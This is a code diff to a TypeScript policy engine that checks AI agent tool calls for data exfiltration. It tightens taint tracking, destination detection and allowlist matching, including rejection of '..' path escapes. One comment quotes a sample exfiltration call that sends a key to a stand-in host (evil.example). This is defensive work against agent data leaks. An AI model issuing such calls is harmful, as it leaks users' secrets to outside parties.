@@ -1,3 +1,4 @@
+import { posix } from "node:path";
 import type { ToolInfo } from "../classify.js";
 import type { TaintMemory, TaintSource } from "../provenance/taint.js";
 import type { BudgetCounter } from "./budget.js";
@@ -43,6 +44,9 @@ export function strictest(decisions: Decision[]): Decision {
 /** Every string leaf of a JSON value, with a JS-like path ("recipients[0].email"). */
 export function stringLeaves(value: unknown, path = ""): { path: string; value: string }[] {
   if (typeof value === "string") return [{ path: path || "(value)", value }];
+  // Numbers too: a chat or account id taken from untrusted text is often numeric.
+  if (typeof value === "number" && Number.isFinite(value))
+    return [{ path: path || "(value)", value: String(value) }];
   if (Array.isArray(value)) return value.flatMap((v, i) => stringLeaves(v, `${path}[${i}]`));
   if (value && typeof value === "object") {
     return Object.entries(value).flatMap(([k, v]) => stringLeaves(v, path ? `${path}.${k}` : k));
@@ -50,28 +54,101 @@ export function stringLeaves(value: unknown, path = ""): { path: string; value: 
   return [];
 }
 
-/** First identifier of the path, lower-cased: "recipients[0].email" → checks both "recipients" and "email". */
-const pathKeys = (path: string): string[] =>
-  path
-    .split(/[.[\]]+/)
-    .filter((k) => k && !/^\d+$/.test(k))
-    .map((k) => k.toLowerCase());
+/** Last words of a key that mean "this is message content", not a destination ("email_body"). */
+const CONTENT_WORDS = new Set([
+  "body",
+  "text",
+  "content",
+  "subject",
+  "message",
+  "note",
+  "notes",
+  "description",
+  "title",
+  "html",
+  "markdown",
+  "summary",
+  "comment",
+]);
 
-function isAllowlisted(value: string, policy: Policy): boolean {
-  const v = value.trim().toLowerCase();
-  const recipient = policy.allow.recipients.some((r) => {
-    const rule = r.toLowerCase();
-    return rule.startsWith("@") ? v.endsWith(rule) : v === rule;
-  });
-  if (recipient) return true;
-  try {
-    const host = new URL(v).hostname;
-    if (policy.allow.hosts.some((h) => host === h.toLowerCase() || host.endsWith(`.${h.toLowerCase()}`)))
-      return true;
-  } catch {
-    // not a URL
+/**
+ * Words of every key in the path, split on "_", "-" and camelCase: "recipients[0].email",
+ * "recipient_email", "toAddress" and "channel_id" all yield a word that names a destination.
+ */
+export function pathWords(path: string): string[] {
+  const words: string[] = [];
+  for (const key of path.split(/[.[\]]+/).filter((k) => k && !/^\d+$/.test(k))) {
+    const parts = key
+      .replace(/([a-z0-9])([A-Z])/g, "$1 $2")
+      .split(/[\s_-]+/)
+      .map((w) => w.toLowerCase())
+      .filter(Boolean);
+    if (CONTENT_WORDS.has(parts.at(-1) ?? "")) continue;
+    words.push(key.toLowerCase(), ...parts);
   }
-  return policy.allow.paths.some((glob) => globToRegExp(glob).test(value.trim()));
+  return words;
+}
+
+/** The argument holds message content (its innermost key ends in a content word). */
+function isContentPath(path: string): boolean {
+  const last =
+    path
+      .split(/[.[\]]+/)
+      .filter((k) => k && !/^\d+$/.test(k))
+      .at(-1) ?? "";
+  const word =
+    last
+      .replace(/([a-z0-9])([A-Z])/g, "$1 $2")
+      .split(/[\s_-]+/)
+      .at(-1)
+      ?.toLowerCase() ?? "";
+  return CONTENT_WORDS.has(word);
+}
+
+const EMAIL = /[a-z0-9._%+-]{1,64}@[a-z0-9-]{1,63}(?:\.[a-z0-9-]{1,63}){1,8}/gi;
+const SINGLE_URL = /^[a-z][a-z0-9+.-]*:\/\/\S+$/i;
+
+/** A value that is itself a destination (addresses, a URL), whatever the argument is called. */
+export function isDestinationValue(value: string): boolean {
+  const v = value.trim();
+  if (SINGLE_URL.test(v)) return true;
+  const emails = v.match(EMAIL) ?? [];
+  if (emails.length === 0) return false;
+  // Only addresses plus separators or display names, e.g. "Ann <ann@x.example>, bob@y.example".
+  return !/[@:/]/.test(v.replace(EMAIL, ""));
+}
+
+/**
+ * Every destination in the value must be allowed. A list with one allowed address, a URL that merely
+ * ends in "@allowed.com", or a path that escapes an allowed folder with ".." is not allowlisted.
+ */
+export function isAllowlisted(value: string, policy: Policy): boolean {
+  const v = value.trim();
+  const lower = v.toLowerCase();
+  if (SINGLE_URL.test(v)) {
+    try {
+      const host = new URL(v).hostname.toLowerCase();
+      return policy.allow.hosts.some((h) => host === h.toLowerCase() || host.endsWith(`.${h.toLowerCase()}`));
+    } catch {
+      return false;
+    }
+  }
+  const emails = lower.match(EMAIL) ?? [];
+  if (emails.length > 0) {
+    if (/[:/]/.test(lower.replace(EMAIL, ""))) return false;
+    return emails.every((email) =>
+      policy.allow.recipients.some((r) => {
+        const rule = r.toLowerCase();
+        return rule.startsWith("@") ? email.endsWith(rule) : email === rule;
+      }),
+    );
+  }
+  if (v.startsWith("/") || v.startsWith("~")) {
+    const normalized = posix.normalize(v);
+    if (normalized.split("/").includes("..")) return false;
+    return policy.allow.paths.some((glob) => globToRegExp(glob).test(normalized));
+  }
+  return false;
 }
 
 function globToRegExp(glob: string): RegExp {
@@ -97,12 +174,14 @@ export function evaluate(
   const findings: Finding[] = [];
   const leaves = stringLeaves(call.args ?? {});
   const sinkKeys = new Set(tool.sinks.map((s) => s.toLowerCase()));
-  const isSink = (path: string) => pathKeys(path).some((k) => sinkKeys.has(k));
+  const isSink = (path: string, value?: string) =>
+    !isContentPath(path) &&
+    (pathWords(path).some((k) => sinkKeys.has(k)) || (value !== undefined && isDestinationValue(value)));
   const provenance: ArgProvenance[] = leaves
     .map((leaf) => {
       const sources = ctx.taint.trace(leaf.value);
       // Short names (repo, owner, channel) only count where they decide the destination.
-      if (sources.length === 0 && tool.kind !== "read" && isSink(leaf.path))
+      if (sources.length === 0 && tool.kind !== "read" && isSink(leaf.path, leaf.value))
         sources.push(...ctx.taint.traceToken(leaf.value));
       return { ...leaf, sources };
     })
@@ -128,7 +207,7 @@ export function evaluate(
     for (const p of provenance) {
       const untrusted = p.sources.filter((s) => s.label === "untrusted");
       if (untrusted.length === 0) continue;
-      if (!isSink(p.path)) continue;
+      if (!isSink(p.path, p.value)) continue;
       if (isAllowlisted(p.value, policy)) continue;
       findings.push({
         rule: "F1",
@@ -141,7 +220,8 @@ export function evaluate(
 
   for (const leaf of leaves) {
     const secrets = findSecrets(leaf.value);
-    if (secrets.length > 0 && tool.openWorld && writes) {
+    // Reads count too: fetch("https://evil.example/?k=<key>") is the commonest way out.
+    if (secrets.length > 0 && tool.openWorld) {
       findings.push({
         rule: "F2",
         decision: "deny",
@@ -150,7 +230,7 @@ export function evaluate(
       });
     }
   }
-  if (writes && tool.openWorld) {
+  if (tool.openWorld) {
     for (const p of provenance) {
       const priv = p.sources.find((s) => s.label === "private");
       if (!priv) continue;
